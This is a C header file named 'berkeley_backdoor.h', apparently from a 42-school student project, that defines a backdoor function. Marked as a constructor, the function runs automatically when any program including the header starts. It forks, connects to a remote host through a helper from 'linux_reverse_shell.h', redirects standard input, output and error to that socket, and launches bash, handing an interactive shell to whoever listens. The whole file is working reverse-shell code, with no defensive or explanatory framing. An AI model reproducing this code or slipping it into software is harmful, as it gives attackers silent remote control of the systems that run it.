/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   berkeley_backdoor.h                                :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/10 17:29:38 by joesanto          #+#    #+#             */
/*   Updated: 2026/01/11 19:23:25 by joesanto         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef BERKELEY_BACKDOOR_H
# define BERKELEY_BACKDOOR_H

# include <unistd.h>
# include <stdlib.h>
# include "linux_reverse_shell.h"

__attribute__((constructor))
static inline
void	berkeley_backdoor(void)
{
	int	client_fd;

	if (fork() != 0)
		return ;
	if (berkeley_client_connection(&client_fd) != 0)
		exit(1);
	if (dup2(client_fd, STDIN_FILENO) == -1)
		(close(client_fd), exit(1));
	if (dup2(client_fd, STDOUT_FILENO) == -1)
		(close(client_fd), exit(1));
	if (dup2(client_fd, STDERR_FILENO) == -1)
		(close(client_fd), exit(1));
	close(client_fd);
	execlp("bash", "bash", NULL);
	exit(1);
}

#endif
